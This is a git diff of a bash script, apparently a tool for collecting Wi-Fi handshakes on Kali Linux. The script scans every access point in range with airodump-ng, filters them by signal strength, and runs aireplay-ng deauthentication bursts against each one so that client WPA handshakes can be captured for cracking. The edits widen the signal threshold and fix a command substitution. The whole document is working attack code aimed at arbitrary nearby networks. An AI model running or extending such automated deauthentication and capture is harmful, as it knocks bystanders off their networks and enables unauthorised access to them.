@@ -93,13 +93,12 @@ checkHandshakes() {
 active() {
   echo "Collect APs..."
   timeout 20 airodump-ng -w /home/kali/hscollector/shakesCollector $interface </dev/null >/dev/null 
-  cat /home/kali/hscollector/shakesCollector-01.kismet.csv
   while IFS=";" read -r id NetType ESSID BSSID Info Channel Cloaked Encryption Decrypted MaxRate MaxSeenRate Beacon LLC Data Crypt Weak Total Carrier Encoding FirstTime LastTime BestQuality BestSignal; do        
           if [[ $BSSID == "BSSID" ]];then
                   continue
           fi
           echo $BestQuality $ESSID $BSSID $Channel
-          if [[ $BestQuality -lt -75 ]]
+          if [[ $BestQuality -lt -80 ]]
           then
                   continue
           fi
@@ -109,7 +108,7 @@ active() {
           airodump-ng --bssid $BSSID --channel $Channel -w /home/kali/hscollector/shakes $interface &>/dev/null &
           pid=echo $!
           aireplay-ng -a $BSSID -0 10 $interface
-          injectionExitCode=echo $?
+          injectionExitCode=`echo $?`
           if [[ $injectionExitCode -ne 0 ]]
           then
                   kill -9 $pid
